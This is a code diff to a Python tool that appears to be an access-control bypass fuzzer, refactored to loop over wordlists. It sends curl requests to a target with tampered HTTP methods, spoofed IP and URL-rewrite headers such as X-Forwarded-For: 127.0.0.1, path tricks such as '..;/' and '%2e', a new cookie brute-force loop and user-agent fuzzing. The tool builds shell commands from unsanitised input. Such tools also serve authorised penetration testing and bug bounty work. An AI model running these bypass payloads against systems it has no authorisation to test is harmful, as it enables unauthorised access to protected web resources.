@@ -3,6 +3,14 @@ import sys
 from os import popen
 
 
+payloads = {
+	"METHODS":open('./lists/MethodsHTTP.txt'),
+	"HEADERS":open('./lists/HeadersHTTP.txt'),
+	"AGENTS":open('./lists/UserAgents.txt'),
+	"VCOOKIES":open('./lists/CookiesValues.txt'),
+	"NCOOKIES":open('./lists/CookiesNames.txt'),
+	"PATH": ["2e", "./", "?", "??", "//", "/./", "/", "/.", "/.randomstring", "..\;/", "/.\;/", "\;foo=bar/"]
+}
 def banner():
 	print('\033[92m    __                 \033[91m__ __           ')
 	print('\033[92m   / /_  __  ______   \033[91m/ // / _  ___  __')
@@ -73,91 +81,48 @@ def main():
 	###########TESTS start here!!!!
 	print('\033[92m\033[1m[+]VERB TAMPERING\033[0m')
 	payload = url + "/" + uri
-	print("ACL: ",curl_code_response(options+" -X ACL",payload))
-	print("ARBITRARY: ",curl_code_response(options+" -X ARBITRARY",payload))
-	print("BASELINE-CONTROL: ",curl_code_response(options+" -X BASELINE-CONTROL",payload))
-	print("CHECKIN: ",curl_code_response(options+" -X CHECKIN",payload))
-	print("CHECKOUT: ",curl_code_response(options+" -X CHECKOUT",payload))
-	print("CONNECT: ",curl_code_response(options+" -X CONNECT",payload))
-	print("COPY: ",curl_code_response(options+" -X COPY",payload))
-	#print("GET: ",curl_code_response(options+" -X DELETE",payload)) #too dangerous!
-	print("GET: ",curl_code_response(options+" -X GET",payload))
-	print("HEAD: ",curl_code_response(options+" -X HEAD -m 1",payload))
-	print("LABEL: ",curl_code_response(options+" -X LABEL",payload))
-	print("LOCK: ",curl_code_response(options+" -X LOCK",payload))
-	print("MERGE: ",curl_code_response(options+" -X MERGE",payload))
-	print("MKACTIVITY: ",curl_code_response(options+" -X MKACTIVITY",payload))
-	print("MKCOL: ",curl_code_response(options+" -X MKCOL",payload))
-	print("MKWORKSPACE: ",curl_code_response(options+" -X MKWORKSPACE",payload))
-	print("MOVE: ",curl_code_response(options+" -X MOVE",payload))
-	print("OPTIONS: ",curl_code_response(options+" -X OPTIONS",payload))
-	print("ORDERPATCH: ",curl_code_response(options+" -X ORDERPATCH",payload))
-	print("PATCH: ",curl_code_response(options+" -X PATCH",payload))
-	print("POST: ",curl_code_response(options+" -X POST",payload))
-	print("PROPFIND: ",curl_code_response(options+" -X PROPFIND",payload))
-	print("PROPPATCH: ",curl_code_response(options+" -X PROPPATCH",payload))
-	print("PUT: ",curl_code_response(options+" -X PUT",payload))
-	print("REPORT: ",curl_code_response(options+" -X REPORT",payload))
-	print("SEARCH: ",curl_code_response(options+" -X SEARCH",payload))
-	print("TRACE: ",curl_code_response(options+" -X TRACE",payload))
-	print("UNCHECKOUT: ",curl_code_response(options+" -X UNCHECKOUT",payload))
-	print("UNLOCK: ",curl_code_response(options+" -X UNLOCK",payload))
-	print("UPDATE: ",curl_code_response(options+" -X UPDATE",payload))
-	print("VERSION-CONTROL: ",curl_code_response(options+" -X VERSION-CONTROL",payload))
+	for custom_payload in payloads['METHODS'].read().splitlines():
+		print(f"Method: {custom_payload} > ",curl_code_response(f"{options} -X {custom_payload}",payload))
 	print("")
 	###########HEADERS
 	print('\033[92m\033[1m[+]HEADERS\033[0m')
-	print("Referer: ",curl_code_response(options+" -X GET -H \"Referer: "+payload+"\"",payload))
-	print("X-Custom-IP-Authorization: ",curl_code_response(options+" -X GET -H \"X-Custom-IP-Authorization: 127.0.0.1\"",payload))
-	payload=url+"/"+uri+"..\;"
-	print("X-Custom-IP-Authorization + ..;: ",curl_code_response(options+" -X GET -H \"X-Custom-IP-Authorization: 127.0.0.1\"",payload))
-	payload=url+"/"
-	print("X-Original-URL: ",curl_code_response(options+" -X GET -H \"X-Original-URL: /"+uri+"\"",payload))
-	print("X-Rewrite-URL: ",curl_code_response(options+" -X GET -H \"X-Rewrite-URL: /"+uri+"\"",payload))
-	payload=url+"/"+uri
-	print("X-Originating-IP: ",curl_code_response(options+" -X GET -H \"X-Originating-IP: 127.0.0.1\"",payload))
-	print("X-Forwarded-For: ",curl_code_response(options+" -X GET -H \"X-Forwarded-For: 127.0.0.1\"",payload))
-	print("X-Remote-IP: ",curl_code_response(options+" -X GET -H \"X-Remote-IP: 127.0.0.1\"",payload))
-	print("X-Client-IP: ",curl_code_response(options+" -X GET -H \"X-Client-IP: 127.0.0.1\"",payload))
-	print("X-Host: ",curl_code_response(options+" -X GET -H \"X-Host: 127.0.0.1\"",payload))
-	print("X-Forwarded-Host: ",curl_code_response(options+" -X GET -H \"X-Forwarded-Host: 127.0.0.1\"",payload))
+	for custom_payload in payloads['HEADERS'].read().splitlines():
+		for value_custom_payload in ["127.0.0.1", "http://127.0.0.1/", "http://127.0.0.1", "http://192.168.1.1", "192.168.1.1", "http://0.0.0.0", "0.0.0.0", payload]:
+			print(f"{custom_payload}: {value_custom_payload} > ",curl_code_response(f'{options} -X GET -H "{custom_payload}: {value_custom_payload}"',payload))
 	print("")
 	###########BUGBOUNTY
 	print('\033[92m\033[1m[+]#BUGBOUNTYTIPS\033[0m')
-	payload=url+"/%2e/"+uri
-	print("%2e: ",curl_code_response(options+" -X GET",payload))
-	payload=url+"/"+uri+"/."
-	print("Ends with /.: ",curl_code_response(options+" -X GET --path-as-is",payload))
-	payload=url+"/"+uri+"?"
-	print("Ends with ?: ",curl_code_response(options+" -X GET",payload))
-	payload=url+"/"+uri+"??"
-	print("Ends with ??: ",curl_code_response(options+" -X GET",payload))
-	payload=url+"/"+uri+"//"
-	print("Ends with //: ",curl_code_response(options+" -X GET",payload))
-	payload=url+"/./"+uri+"/./"
-	print("Between /./: ",curl_code_response(options+" -X GET --path-as-is",payload))
-	payload=url+"/"+uri+"/"
-	print("Ends with /: ",curl_code_response(options+" -X GET",payload))
-	payload=url+"/"+uri+"/.randomstring"
-	print("Ends with .randomstring: ",curl_code_response(options+" -X GET",payload))
-	payload=url+"/"+uri+"..\;/"
-	print("Ends with ..;: ",curl_code_response(options+" -X GET --path-as-is",payload))
-	payload=url+"/.\;/"+uri
-	print("Between /.;/: ",curl_code_response(options+" -X GET --path-as-is",payload))
-	payload=url+"\;foo=bar/"+uri
-	print("Between ;foo=bar;/: ",curl_code_response(options+" -X GET --path-as-is",payload))
+
+	for custom_payload in payloads['PATH']:
+		payload=f'{url}/{custom_payload}/{uri}'
+		payload_sec=f'{url}/{uri}/{custom_payload}'
+		print(f"start with: {payload} > ",curl_code_response(options+" -X GET",payload))
+		print(f"start with (path as is): {payload} >  ",curl_code_response(options+" -X GET --path-as-is",payload))
+		print(f"end with: {payload_sec} > ",curl_code_response(options+" -X GET",payload_sec))
+		print(f"end with (path as is): {payload_sec} >  ",curl_code_response(options+" -X GET --path-as-is",payload_sec))
+		
+	print("")
+
+	###########Cookies Brute Force
+	payload=url+"/"+uri
+	response=input("Do you want to try with Cookies Brute Force ? [y/N]: ")
+	if response.lower() == 'n' or response == "":
+		sys.exit(1)
+	else:
+		for value_cookie in payloads['VCOOKIES'].read().splitlines():
+			for name_cookie in payloads['NCOOKIES'].read().splitlines():
+				print(f"{name_cookie}={value_cookie} :" + curl_code_response(f'{options} -X GET -H "Cookie: {name_cookie}={value_cookie}"',payload))
+
 	print("")
 	###########UserAgents
-	payload=url+"/"+uri
 	response=input("Do you want to try with UserAgents.fuzz.txt from SecList? (2454 requests) [y/N]: ")
 	if response.lower() == 'n' or response == "":
 		sys.exit(1)
 	else:
 		print('\033[92m\033[1m[+]UserAgents\033[0m')
-		with open("UserAgents.fuzz.txt") as file:  
-			for line in file:
-				print(line.strip()+":"+curl_code_response(options+" -X GET -H \"User-Agent: "+line.strip()+"\"",payload))
-
+		  
+		for line in payloads['AGENTS'].read().splitlines():
+			print(line.strip()+":"+curl_code_response(options+" -X GET -H \"User-Agent: "+line.strip()+"\"",payload))
 
 if __name__ == "__main__":
 	try:
